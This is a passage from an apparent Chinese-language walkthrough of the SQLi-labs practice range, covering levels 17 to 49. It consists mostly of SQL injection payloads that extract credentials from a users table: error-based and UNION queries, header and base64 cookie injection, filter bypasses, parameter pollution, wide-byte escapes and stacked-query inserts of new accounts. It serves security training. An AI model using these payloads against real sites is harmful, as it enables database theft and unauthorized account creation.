table_name=&#39;users&#39;),0x7e),1)# 回显 XPATH syntax error: &#39;~id,username,password~&#39; 我想用同样的方法利用uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#取字段，却返回了 You can&#39;t specify target table &#39;users&#39; for update in FROM clause 这是因为不能依据某字段值做判断再来更新某字段的值。 百度的方法是把查询结果作为中间表，然后再查询一边中间表作为结果。 所以先查一边作为中间表 (SELECT username from users limit 0,1) as a 然后进行再查中间表得到 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT username from (SELECT username from users limit 0,1) as a limit 0,1),0x7e),1)# （上面的payload中，可以直接改username为password取密码，然后limit 改一下取不同字段的。爆破一下就出来了） 回显 XPATH syntax error: &#39;~Dumb~&#39; 下面是我自己随便写的脚本，用来取username和password的 Less-18 POST-基于报错的uagent处的头部注入我们先测试随便post些东西，然后会返回你的ip地址。可以发现这题的回显在ip了 直接看源码吗，发现uname和passwd都进行了过滤，但是出现了有个uagent 我们要先保证输入的账号密码是正确的，然后可以返回User-Agent，因此这题的注入点就在User-Agent。 我们通过brupsuite进行抓包，将User-Agent结尾加上&#39;发现会报错，因此可以在该处进行sql注入。 根据返回的进行判断，返回了一个INSEERT INTO table VALUES(&#39;User-Agent&#39;,&#39;Ip&#39;,&#39;Username&#39;) 我们可以构造一个User-Agent=1&#39;,1,1)#进行绕过，返回了 然后我们就可以同样利用updatexml()进行注入 构造User-Agent:1&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#，回显 得到了数据库，因此同样可以以17题方法进行查询 取表 User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1))# 取列 User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1))# 取字段 User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select concat(username,&#39;~&#39;,password) from users limit 0,1),0x7e),1))# 然后可以一个一个用bp爆破的找了 Less-19 POST-基于报错的refer处的头部注入与18题类似，先看一下源代码 这里的会返回uagent和ip的值，因此我们同样先在referer后面加上&#39;，然后看报错，判断发现存在报错信息。 返回了一个INSEERT INTO table VALUES(&#39;referer&#39;,&#39;Ip&#39;) 因此我们可以构造一个referer=1&#39;,1)#绕过 接下来就一样方法取了。 Referer:1&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) # 取数据库 Referer:1&#39;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)) # 取表 Referer:1&#39;,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)) # 取列 Referer:1&#39;,updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e),1)) # 取字段 Less-20 POST-基于报错的uagent处的Cookie注入同样输入admin和admin进行验证，发现会返回一系列的数值，其中包含了cookie。 然后我们查看源码发现，在读cookie的 时候没有经过很严格的过滤，并且进行了二次调用，因此我们可以在cookie处进行二次注入。 先利用Cookie: uname=admin&#39; or 1=1#发现可以进行绕过 然后就可以开始用updatexml进行注入。 取数据库 Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select database()),0x7e),0x7e)# 取表 Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e),0x7e)# 取列 Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&#39;users&#39;),0x7e),0x7e)# 取字段 Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select concat(0x7e,username,0x7e,password,0x7e) from users limit 0,1),0x7e),0x7e)# （此处同样可以爆破） Less-21 POST-Cookie注入-base64加密-单引号用admin进行测试，发现会回显uname = YWRtaW4=这个是admin的base64格式。 我们通过观察一下源码，发现在源码中，先对uname进行base64加密，然后在后面，在对其解密，其中没有经过过滤 因此我们在抓包修改cookie进行注入的时候，可以先把payload进行base64，然后成功读入后，在被解的时候，可以返回报错信息，实现注入。 由于base64编码中#有问题，所以我用了and ’1‘=’1进行绕过 先取数据库 Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ== 取表 Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9InNlY3VyaXR5IiksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ== 取列 Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0ic2VjdXJpdHkiIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDB4N2UpIGFuZCAnMSc9JzE= 取字段 Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgY29uY2F0KDB4N2UsdXNlcm5hbWUsMHg3ZSxwYXNzd29yZCwweDdlKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ== Less-22 POST-Cookie注入-base64加密-双引号查看源码，与21只有细微差别，就是源码里用的双引号 取数据库 Cookie:uname=YWRtaW4iIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMHg3ZSkgYW5kICIxIj0iMQ== 取表 Cookie:uname=YWRtaW4iIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyksMHg3ZSksMHg3ZSkgYW5kICIxIj0iMQ== 取列 Cookie:uname=YWRtaW4iIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lPSJ1c2VycyIpLDB4N2UpLDB4N2UpIGFuZCAiMSI9IjE= 取字段 Cookie:uname=YWRtaW4iIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgY29uY2F0KDB4N2UsdXNlcm5hbWUsMHg3ZSxwYXNzd29yZCwweDdlKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSksMHg3ZSkgYW5kICIxIj0iMQ== Less-23 GET-基于报错的过滤注释的注入这题开始，加入了过滤的元素 将我们常用的#和–这两个注释符号进行过滤，不过我们在前面的题目已经有了经验，可以用 or &#39;1&#39;=&#39;1来绕过 通过?id=-1&#39; union select 1,2,3 or &#39;1&#39;=&#39;1测试发现可以回显2行 1，2为回显的信息位置 但是当我用?id=-1&#39; union select database(),user(),3 or &#39;1&#39;=&#39;1 试图获取信息时，只返回了user()，没有返回database()而是为1 我才发现密码错误的话一定返回的是1.我们可以得到回显的位置的只有2的位置。 我将payload改为?id=-1&#39; union select 1,database(),3 or &#39;1&#39;=&#39;1 得到了数据库 接下来就和之前类似了。当然也可以直接利用现有的&#39;进行闭合取表。 ?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security 取列 ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users 取字段 ?id=-1&#39; union select 1,concat(username,0x7e,password),3 from users where &#39;1&#39;=&#39;1 当然，在本题有一个更好的方法，就是利用;%00进行截断，同样可以取到数据。 %00被解析成0x00实现了截断的作用。 ?id=-1&#39; union select 1,concat(username,0x7e,password),3 from users limit x,1;%00 然后也可以用updatexml结合;%00做题 ?id=-1&#39; and updatexml(1,concat(0x7e,(select concat(password,0x7e,username) from users limit x,1),0x7e),1);%00 (x为任意数字，每次取不同的进行爆破) Less-24 POST-二次注入这题的漏洞点不在前端而在于数据二次调用没有过滤干净。 在源码中，没有对输入的username进行过滤，导致我们可以先注册一个admin&#39; # 实现登录，在登录后对账户密码进行修改。 然后我们再尝试实现登录admin账户，密码是我们刚才设置的。 Less-25 GET-基于报错的过滤OR和AND的字符型注入这题有Hint: Your Input is Filtered with following result: 在此处会输出你被过滤后的payload。 我尝试输入?id=1&#39; or 1=1 #，返回了1&#39; 1=1 1=1证明我们的注释符号还有or和and被过滤了。 注释符号被过滤我们前面已经遇到过了，而or和and被过滤，我们可以考虑使用双写绕过。 输入?id=1&#39; anandd 1=1;%00，被过滤后形成1&#39; and 1=1; 接下来思路就一样了，取数据库 ?id=-1&#39; anandd updatexml(1,concat(0x7e,(select database()),0x7e),1);%00 取表（这里的information同样存在or要双写绕过） ?id=-1&#39; anandd updatexml(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;security&#39;),0x7e),1);%00 取列 ?id=-1&#39; anandd updatexml(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#39;security&#39; anandd table_name=&#39;users&#39;),0x7e),1);%00 取字段 ?id=-1&#39; anandd updatexml(1,concat(0x7e,(select concat(0x7e,username,0x7e,passwoorrd) from users limit x,1),0x7e),1);%00 (x为任意的数字可以爆破) 当然，如果使用union联合搜索用不到and，自然也不需要双写绕过and也是可以做的，依然要双写绕过password的or。 ?id=-1&#39; union select 1,concat(0x7e,username,0x7e,passwoorrd,0x7e),3 from users limit 0,1;%00 还有and同时也可以用&amp;&amp;进行替代，or用||替代，;%00用%23（#的ASCII码）进行替代。但是本题不知道为啥我用&amp;&amp;好像也被过滤掉了，源码我也没找到。不过我用&amp;的ASCII码%26成功的绕过了。 ?id=-1&#39; || updatexml(1,concat(0x7e,(select concat(0x7e,username,0x7e,passwoorrd) from users limit 0,1),0x7e),1)%23 ?id=-1&#39; %26%26 updatexml(1,concat(0x7e,(select concat(0x7e,username,0x7e,passwoorrd) from users limit 0,1),0x7e),1)%23 Less-25a GET-基于盲注的过滤OR和AND的单引号注入这题是上一题的拓展，主要是增加了盲注的难度，但是这关的语句中，并没有存在单引号的包裹 因此我们可以构造盲注语句判断有3列 ?id=-1 oorrder by 3;%00 然后在判断回显的位 ?id=-1 union select 1,2,3 ;%00 ?id=-1 union select 1,database(),user() ;%00 取表 ?id=-1 union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#39;security&#39;;%00 取列 ?id=-1 union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=&#39;security&#39; anandd table_name=&#39;users&#39;;%00 取字段 ?id=-1 union select 1,group_concat(passwoorrd),group_concat(username) from users limit 0,1;%00 （太长了不放结果了） Less-26 GET-基于报错的过滤空格和注释的注入（本关在windows平台下有的字符会变成?Linux下就可以实现，这是因为apche的解析问题） 先用?id=1&#39; or%20 1=1# 进行尝试，发现返回了 这题是对空格和注释符号进行过滤，查看源码发现 过滤了or,and,/*,--,空格,/,比之前严格了很多，但是主要是多了空格，而空格的绕过方法有很多种。 第一种可以用/**/注释符进行绕过，当然在本题也被ban了。 第二种用()进行包围，如使用?id=0&#39;(union(select(1,database(),3)));%00，成功得到了回显。 第三种用%09tab键，%0a新建一行，%0c新的一页，%odreturn功能，%0btab垂直，%a0空格等这些编码格式进行绕过 然后这题的话我用的是双写和括号进行绕过 ?id=1%27anandd(updatexml(1,concat(0x7e,(select(database())),0x7e),1))；%00 回显了 取表 ?id=1%27anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),0x7e),1));%00 取列 ?id=1%27anandd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)anandd(table_name=&#39;users&#39;)),0x7e),1));%00 取字段 ?id=1%27anandd(updatexml(1,concat(0x7e,(select(group_concat(0x7e,username,0x7e,passwoorrd,0x7e))from(users)where(id=1)),0x7e),1));%00 在这里可以发现用的是group_concat而不是concat。因为我这题一开始想用concat，但在处理limit 0,1进行每次取一个字段的时候，想不到方法进行绕过，有知道的师傅也可以教教我。 group_concat(),concat(),concat_ws()三者的差别在于回显的字段数是不同的。 Less-26a GET-基于盲注的过滤空格和注释的单引号带括号注入这题与上一题的差别在于闭合的方式，本题采用了’)的闭合方式 ?id=0&#39;)anandd(updatexml(1,concat(0x7e,(select(database())),0x7e),1));%00 取数据库 ?id=0&#39;)anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),0x7e),1));%00取表 ?id=0&#39;)anandd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)anandd(table_name=&#39;users&#39;)),0x7e),1));%00取列 ?id=0&#39;)anandd(updatexml(1,concat(0x7e,(select(group_concat(0x7e,username,0x7e,passwoorrd,0x7e))from(users)where(id=1)),0x7e),1));%00 取字段 Less-27 GET-基于报错的过滤UNION和SELECT的单引号注入前面的基础上又过滤了select和union，就用不了联合搜索了。看一下源码，大概过了了一些常用的select，union包括大小写 但我们上一题的payload可以直接打，而且在这里还没有过了and和or，不用双写绕过 ?id=1%27and(updatexml(1,concat(0x7e,(database()),0x7e),1));%00取数据库 ?id=1&#39;and(updatexml(1,concat(0x7e,(seLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;)),0x7e),1));%00取表 （这里用的是大小写绕过的方式，利用seLect绕过过滤） ?id=1&#39;and(updatexml(1,concat(0x7e,(seLect(group_concat(column_name))from(information_schema.columns)where(table_schema=&#39;security&#39;)and(table_name=&#39;users&#39;)),0x7e),1));%00取表 ?id=1&#39;and(updatexml(1,concat(0x7e,(seLect(group_concat(0x7e,username,0x7e,password))from(users)where(id=1)),0x7e),1));%00 取字段 Less-27a GET-基于盲注的过滤UNION和SELECT的双引号注入和上一题一样，只是把单引号换成了双引号,这次我们用联合查询的方式进行注入。 先利用大小写绕过的方式，加上用%0a进行代替空格，实现找到注入点。 ?id=0&quot;%0aUNion%0aseLEct%0a1,2,3||%0a&quot;1 然后找数据库名 ?id=0&quot;%0aUNion%0aseLEct%0a1,database(),3||%0a&quot;1 id=0&quot;%0aUNion%0aseLEct%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;%26%26%0a&quot;1 然后通过%26%26代替&amp;&amp;，大小写绕过union过滤实现注入 id=0&quot;%0aUNion%0aseLEct%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=&#39;security&#39;%0aand%0atable_name=&#39;users&#39;%26%26%0a&quot;1 ?id=0&quot;%0aUNion%0aseLEct%0a1,concat(username,&#39;~&#39;,password),3%0afrom%0ausers%0awhere(id=1)%26%26%0a&quot;1 最后实现取列，取字段 Less-28 GET-基于报错的过滤UNION和SELECT的单引号带括号注入这题多加了对union和select在一起的使用。 通过之前的经验，我们同样用双写的方式进行绕过 取数据库 ?id=0&#39;)union%0aunion%0aselectselect%0d1,2,3;%00 ?id=0&#39;)union%0aunion%0aselectselect%0d1,database(),3;%00 取表 id=0&#39;)union%0aunion%0aselectselect%0d1,group_concat(table_name),3%0afrom(information_schema.tables)where(table_schema=&#39;security&#39;);%00 取列 id=0&#39;)union%0aunion%0aselectselect%0d1,group_concat(column_name),3%0afrom(information_schema.columns)where(table_schema=&#39;security&#39;)and(table_name=&#39;users&#39;);%00 取字段 id=0&#39;)union%0aunion%0aselectselect%0d1,concat(username,0x7e,password),3%0afrom(users)limit%0a0,1;%00 Less-28a GET-基于盲注的过滤UNION和SELECT的单引号带括号注入和上一题是一样的，因此payload也可以直接用，而且这里的过滤更加少一点，可以直接用注释符而不用;%00 id=0&#39;)union%0aunion%0aselectselect%0d1,concat(username,0x7e,password),3%0afrom(users)limit%0a0,1--+ Less-29 GET-基于报错的缺乏证据不匹配，前端带WAF的单引号注入29题与前面的不同，也不再只是一个index.php 如果我们直接在原来的页面上测试，这就和第一关一样，没什么意义，因此在看了别的师傅写的wp之后，我发现本题应当转到 进行入手 先用?id=1&#39;进行测试，发现被拦截了，跳转到hacked.php中，说明我们遇到了题目的WAF这也证明我们走对了方向了。 然后在这题有一个新的知识点。 HTTP Parameter Pollution（HTTP参数污染） 题目里也给了学习的文档链接  ​ HTTP 参数污染 (HPP) 是一种 Web 攻击规避技术，允许攻击者通过更改 HTTP 请求以操纵或搜索隐藏信息。这种规避技术基于在具有相同名称的参数的多个实例之间拆分攻击向量。某些环境通过从请求中连接的参数名称的所有实例中获取的值来处理此类请求。 在HTTP请求中，使用&amp;可以连接不同的参数：id=1&amp;username=2 而如果参数重复，比如id=1&amp;id=2&amp;id=3，php的取值只会取最后一个来输出，形成http参数污染。具体的不同的服务器端，在这种情况下优先的取值是不同的。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache Getvalue(“par”) All(List) ASP/IIS Request.QueryString(“par”) All(comma-delimited string) 本题的waf是一个jsp服务器，起到了防火墙的作用。数据在从Client访问服务器，就先直接访问到了tomcat为引擎的 jsp 型服务器，过滤完后传入 apache 为引擎的php服务器中。将数据进行处理，返回到jsp服务器，打印到客户端。由于本题实际上进行处理的是php服务器，因此我们要将注入点放在后面一个参数上。 尝试输入： ?id=0&amp;id=0&#39; union select 1,database(),3 --+ 得到数据库名，同样是得到回显 接下来思路就和之前一样了 ?id=0&amp;id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+ 取表 取列 ?id=0&amp;id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+ 取字段 ?id=0&amp;id=0&#39; union select 1,group_concat(username),group_concat(password) from users--+ Less30 GET-基于盲注的缺乏证据不匹配，前端带WAF的双引号注入这题与上面类似，只是变成了双引号包裹 ?id=0&amp;id=0&quot; union select 1,database(),3 --+ 取数据库 ?id=0&amp;id=0&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+取表 ?id=0&amp;id=0&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+ 取列 ?id=0&amp;id=0&quot; union select 1,group_concat(username),group_concat(password) from users--+取字段 Less31 GET-基于盲注的缺乏证据不匹配，前端带WAF的双引号带括号注入在前一题的基础上，增加了带括号的包裹 ?id=0&amp;id=0&quot;) union select 1,database(),3 --+ 取数据库 ?id=0&amp;id=0&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+取表 ?id=0&amp;id=0&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+ 取列 ?id=0&amp;id=0&quot;) union select 1,group_concat(username),group_concat(password) from users--+取字段 Less32 GET-Bypass自定义过滤器,为危险字符增加斜杠本题中，对所有输入的特殊字符，主要是&#39;,&quot;,\\都会进行过滤源码如下 输入?id=&#39;\\&quot;下面回显了转义后的结果 在本题，我们要用到新的知识点，宽字节注入。 宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。 我们所有的特殊字符，会出现被\\转义的情况，也就是5c，那么如果我们可以把这%5c“吃掉”，那么就能解决这个转义的问题。 那么“吃掉”这个%5c，就要用到宽字节注入。 基于MySQL的特性，在使用GBK编码的过程中，会认为两个字符为一个汉字（前一个ASCII码要大于128，才到汉字的范围）。 因为GBK是多字节编码，他认为两个字节代表一个汉字，所以前面一个编码和后面的%5c一起构成一个汉字，然后实现过滤） 比如我们可用一下%bb,和\\的hex编码组合在一起形成了%bb%5c 也就是汉字籠，然后我们就可以通过这方式，绕过过滤，实现注入。 同样先找注入点，然后得到数据库信息。 ?id=0%bb%27%20union%20select%201,2,3--+ ?id=0%bb%27%20union%20select%201,database(),3--+ 我一开始想的，这不是很简单，直接抄，一通payload打下，发现是错的。 错误的payload：?id=0%bb&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=%bb&#39;security%bb&#39;--+ 因为你在这不可避免得用到&#39; ，如果只是用%bb进行绕过，不可避免的会把table_schema读成security%bb%5c,这和我们目标是数据库名不同的。因此我们可以利用数据库自动解析十六进制的功能。 利用security的十六进制是0x7365637572697479 ?id=0%bb&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+ 取表 ?id=0%bb&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+ 取列 ?id=0%bb&#39; union select 1,group_concat(username),group_concat(password) from users--+ 取字段 Less33 GET-绕过Addslashes()函数和上一题的做法是一样的，只是在这里绕的是addslashes()函数，上面是自定义的结构 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 ​ 预定义字符是： ​ 单引号（’） ​ 双引号（”） ​ 反斜杠（\\） ​ NULL ?id=0%dd%27%20union%20select%201,database(),3--+ 取数据库 ?id=0%bb&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+取表 ?id=0%bb&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+取列 ?id=0%bb&#39; union select 1,group_concat(username),group_concat(password) from users--+取字段 Less34 POST-绕过Addslashes()函数和33一个思路，只是改成了POST的形式，在uname和passwd处均有注入点，这次只能返回2个参数。 我是在password进行的注入 uname=0&amp;passwd=0%bb&#39; union select 1,database()--+&amp;submit=Submit 取数据库 uname=0&amp;passwd=0%bb&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+&amp;submit=Submit 取表 uname=0&amp;passwd=0%bb&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+&amp;submit=Submit 取列 uname=0&amp;passwd=0%bb&#39; union select group_concat(username),group_concat(password) from users--+&amp;submit=Submit 取字段 Less-35 GET-绕过添加我们不需要的斜杠的整型注入在这题根本不用考虑到/了，因为这里用的不需要&#39;或者&quot;闭合，因此直接修改前面的payload即可 payload:?id=0 union select 1,group_concat(username),group_concat(password) from users--+ 其他不多赘述了 Less-36 GET-绕过MySQL_real escape_string()函数先看一下这个函数: mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符 下列字符受影响： \\x00 \\n \\r \\ ‘ “ \\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false. 同样用前面33关的方法进行注入 ?id=0%bb&#39;union%20select%201,database(),3--+ 取数据库 ?id=0%bb&#39; union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+ 取表 ?id=0%bb&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+ 取列 ?id=0%bb&#39; union select 1,group_concat(username),group_concat(password) from users--+取字段 Less-37 POST-绕过MySQL_real escape_string()函数和前面几关类似 uname=0&amp;passwd=0%bb&#39; union select 1,database()--+&amp;submit=Submit 取数据库 uname=0&amp;passwd=0%bb&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+&amp;submit=Submit 取表 uname=0&amp;passwd=0%bb&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+&amp;submit=Submit 取列 uname=0&amp;passwd=0%bb&#39; union select group_concat(username),group_concat(password) from users--+&amp;submit=Submit 取字段 Less-38 GET-字符型堆叠注入（本题开始，难度好像又上升了） 如果我们跟之前一样用?id=0&#39; union select 1,group_concat(username),group_concat(password) from users--+，是可以出结果的，但这并不是我们这题想要的做法。 本题题目提到了堆叠注入，关键是在于mysqli_multi_query()这个函数。 它可以执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 我们可以先任意执行一个语句，用;进行闭合后，再创建新的项在数据库种。 我们现在数据库里测试： 搜索所有users 的信息，然后再搜索1，2，3。发现可以正常回显第一条和第二条查询的信息。 那我们如果可以利用堆叠注入，将新的用户插入数据库，是不是就能进行对数据库信息的修改，从而达到入侵的目的。 我们尝试在users表中插入一个id为100，账号密码均为test的字段。第一遍的结果是正常回显users表 再次查users表，发现已经将新的test用户进行了添加。 因此我们可以发现堆叠注入能够实现加入新的用户的功能。 在靶场中进行尝试。 根据前面的经验一步步注入直接查到存在users表并且是里面有三个字段 我们第一遍用?id=1&#39;;insert into users values(20,&#39;test1&#39;,&#39;test1&#39;);--+进行字段的添加，第二遍?id=20进行搜索，发现已经有了我们新加入的字段 Less-39 GET-整型堆叠注入和38题是一样的，关键就是先找到闭合的方式，然后再注入。 用?id=1&#39; or 1=1--+测试发现是不需要单引号进行闭合，直接就可以进行注入. 第一遍：?id=1;insert into users values(21,&#39;test2&#39;,&#39;test2&#39;);--+ 第二遍?id=21查是否成功 Less-40 GET-字符型堆叠盲注注入这题的闭合采用了&#39;)的方式，和上面的也不一样，但是注入的思路是一样的。 第一遍：?id=1&#39;);insert into users values(22,&#39;test3&#39;,&#39;test3&#39;);--+ 第二遍?id=22查是否成功 Less-41 GET-整型堆叠盲注注入这次还是和39一样的闭合方式。 第一遍：?id=1;insert into users values(23,&#39;test4&#39;,&#39;test4&#39;);--+ 第二遍：?id=23 Less-42 POST-字符型堆叠报错注入这题开始用POST形式，和之前我们遇到的一个很像，但是不一样，因为这里不允许注册新用户。因此我们要直接在登录处找注入点。 本题的注入点在password处。 第一遍我们账号任意，密码为1&#39;;insert into users values(24,&#39;test5&#39;,&#39;test5&#39;);--+进行登录尝试。 第二次我们直接用注入后的账号密码test5和test5成功登录。 Less-43 POST-字符型带括号堆叠报错注入本题和43题一样的，都在password处未进行过滤。然后闭合的多加了个括号为&#39;)。因此我们可以同样注入 第一遍：1&#39;);insert into users values(25,&#39;test6&#39;,&#39;test6&#39;);--+ 第二遍直接登录 Less-44 POST-字符型堆叠报错盲注注入这题和前面不一样的地方在于没有明显的报错，无法直接获取数据库有关信息，只能通过布尔盲注来进行数据库的信息获取。 先测试数据库的名字：&#39;or (ascii(substr((database()),1,1)))=115# 位数一样一位一位更改。 其他不赘述了，之后一样注入方法。 第一遍：login_user=1&amp;login_password=1&#39;;insert into users values(26,&#39;test7&#39;,&#39;test7&#39;);--+&amp;mysubmit=Login 第二遍直接test7登录 Less-45 POST-字符型带括号堆叠报错盲注注入和上一题一样，只是多了个括号，注入方法也类似。 第一遍：login_user=1&amp;login_password=1&#39;);insert into users values(27,&#39;test8&#39;,&#39;test8&#39;)--+&amp;mysubmit=Login 第二遍直接登录。 然后这部分的就都做完了，给你们看看我现在的数据库 然后可以利用sqllab自带的那个Setup/reset Database for labs，直接重置就好了。 Less-46 GET-基于报错的数字型ORDER BY的注入这题的输入方式和之前的不同，Please input parameter as SORT with numeric value。当我们输入?sort=1时，按第一列排序，输入?sort=2是按第二列排序。猜测是运用到了order by排序。然后我们查看源码。发现确实存在语句 因此我们可以对order by处进行注入。 order by处和我们之前遇到的在where后的不同，不能运用union进行注入，但是同样可以用之前用到的updatexml()报错注入的方式。 先用?sort=1 or 1=1#判断是无单引号包裹的。 ?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 取数据库 ?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)--+取表 ?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+ 取列 ?sort=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users where id= 1),0x7e),1)--+ 取字段 Less-47 GET-基于报错的字符型ORDER BY的注入与上一题相同，闭合方式不同而已。也就是多了个&#39; ?sort=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 取数据库 ?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)--+ 取表 ?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+ 取列 ?sort=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users where id= 1),0x7e),1)--+ 取字段 Less-48 GET-基于报错的数字型ORDER BY的盲注注入这题相对于46的难度增加盲注的部分。直接可以拿前面的盲注脚本改一下就行。 就附上修改的一部分而已。 ?sort=1 and if(length(database())=8,sleep(1.5),1)--+ 判断数据库长度 主要就是利用length判断每个字段的长度，substr来获取查询信息的位数，用if判断是否相等，ascii判断具体的字母。 Less-49 GET-基于报错的字符型ORDER 